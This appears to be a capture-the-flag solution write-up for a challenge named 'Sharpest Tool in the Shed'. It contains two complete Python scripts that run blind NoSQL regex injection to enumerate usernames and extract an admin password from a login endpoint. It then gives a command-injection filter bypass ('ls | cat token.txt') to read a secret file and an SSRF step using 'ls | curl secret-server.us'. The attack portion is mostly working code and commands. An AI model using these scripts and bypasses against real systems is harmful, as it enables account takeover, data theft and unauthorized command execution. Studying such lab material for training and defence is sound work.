# Sharpest Tool in the Shed Solution

### Log in as an Admin

- This is a blind NoSQL injection

- The endpoint is admin-tools.us/users
- The main goal here is to create a script to find out what you need in order to get the credentials to login as an admin
  - You need the user, password, and you must find the group
  - You could try to populate all of the users and passwords and try each one
- The schema of a user is:

  - ```JSON
    user: {
      username: username,
      group: user or admin,
      password: password
    }
    ```

- You can do a regex search in the field of the object like so:

  - ```JSON
      user: {
        username: {$regex: "^"}
      }
    ```

- You would do this for each field in order to get the correct combination of user, group and password
- To complete the attack, you would loop through a list of acceptable strings in order to find the correct information in the database
- Below are the attacks in order: username, password
- Group would be found by using the password script but removing the password section and replacing "group": "admin" to "group": {"$regex": "^%s"}
  - Also note you would also have to replace password with group in all fields and change (username, password + c) to (username, group + c)
- Scripts and more information on the attack are found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#blind-nosql)

  - ```Python
    import requests
    import urllib3
    import string
    import urllib
    import time
    urllib3.disable_warnings()
    
    u="http://admin-tools.us/users"
    headers={'content-type': 'application/json'}
    
    first_letters = []
    username = ""
    usernames = []
    
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$regex": "^%s"}}' % (c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'taken' in r.text:
                print("Found first letter : %s" % (c))
                first_letters.append(c)
    
    for letter in first_letters:
        username = letter
        print(username)
        while (username.find("$") == -1):
            for c in string.printable:
                if c not in ['*','+','.','?','|','^']:
                    payload='{"username": {"$regex": "^%s"}}' % (username + c)
                    r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
                    if 'taken' in r.text:
                        print("Letter found in username : %s" % (username + c))
                        username += c
        usernames.append(username)
    
    print("NOTE: $ are not in the username!")
    print("Also, ^admin is not being used!")
    print(usernames)
    ```

  - ```Python
    import requests
    import urllib3
    import string
    import urllib
    urllib3.disable_warnings()
    
    list_username=["Dart", "Haschel", "Kongol", "Lavitz", "Meru", "Rose"]
    password=""
    group=""
    u="http://admin-tools.us/users"
    headers={'content-type': 'application/json'}
    
    while True:
        for username in list_username:
            found = False
            for c in string.printable:
                if c not in ['*','+','.','?','|']:
                    payload='{"username": {"$eq": "%s"}, "group": "admin", "password": {"$regex": "^%s"}}' % (username, password + c)
                    r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
                    if c == "~":
                        if found == False:
                            list_username.remove(username)
                            break
                    if 'taken' in r.text:
                        if c == "$":
                            print("%s:%s" % (username, password))
                            quit()
                        print("Found one more char : %s" % (password+c))
                        password += c
                        found = True
    ```

### Contents of "token.txt"

- Once you log into the admin account, you have a token checker tool
- You have to avoid the hard-coded filter
  - It's filtering "$(" and "&"
  - But it's not filtering |
  - It's also making sure you're using ls in the command
- So the correct command should be "ls | cat token.txt"

### POST the secret server

- This is an SSRF
- You have to query secret-server.us from admin-tools.us
- You have the new filtered command in order to do this
- To find the endpoint, you notice there's a status of the server at the bottom of admin-tools.us
- If you inspect the page, and look at networking, you can see it's contacting secret-server.us/ping.php
- If you try to visit the site, it will give you an error that only admin-tools can use the endpoint
- The correct command is "ls | curl secret-server.us" in the token checker tool